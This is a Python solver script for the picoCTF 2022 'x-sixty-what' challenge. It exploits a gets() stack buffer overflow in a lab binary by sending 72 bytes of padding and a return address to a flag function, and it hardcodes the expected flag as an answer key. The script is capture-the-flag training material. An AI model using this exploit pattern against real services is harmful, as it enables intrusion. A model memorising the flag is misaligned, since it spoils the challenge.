#!/usr/bin/env python3
"""Solver for Challenge 319 x-sixty-what (picoCTF 2022, Binary Exploitation).

64-bit gets() overflow in vuln(): buf 64 + saved rbp 8 -> RIP at offset 72.
Ret to flag+1 (0x40123b, the instruction after `push rbp`) — entering at flag+0
misaligns the stack and crashes in printf's movaps. flag() reads flag.txt and
prints it via printf(buf) (format-string, but direct output suffices).

Lab is on-demand (PUT /api/challenges/319/instance/); host:port rotates
(`nc xebec.cylabacademy.net <port>` from the instance description).
Usage: solve_319_x_sixty_what.py [host] [port]
Verified: academy{b1663r_15_b3773r_fb3754c3} (POST /api/submissions/ -> correct:true)
"""
import re
import socket
import sys

HOST = "xebec.cylabacademy.net"
PORT = 20677
RET = 0x40123B
EXPECTED = "academy{b1663r_15_b3773r_fb3754c3}"


def solve(host: str = HOST, port: int = PORT, timeout: int = 30) -> str:
    s = socket.create_connection((host, int(port)), timeout=timeout)
    s.settimeout(timeout)
    f = s.makefile("rwb", buffering=0)
    data = b""
    while b":" not in data[-200:]:
        chunk = f.read(4096)
        if not chunk:
            break
        data += chunk
    f.write(b"A" * 72 + RET.to_bytes(8, "little") + b"\n")
    out = b""
    try:
        while True:
            chunk = f.read(4096)
            if not chunk:
                break
            out += chunk
            if len(out) > 8192:
                break
    except Exception:
        pass
    m = re.search(rb"academy\{[^}]*\}", out)
    assert m, "no flag in output: %r" % out[:500]
    flag = m.group(0).decode()
    print(flag)
    assert flag == EXPECTED, flag
    return flag


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else HOST
    p = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    solve(h, p)
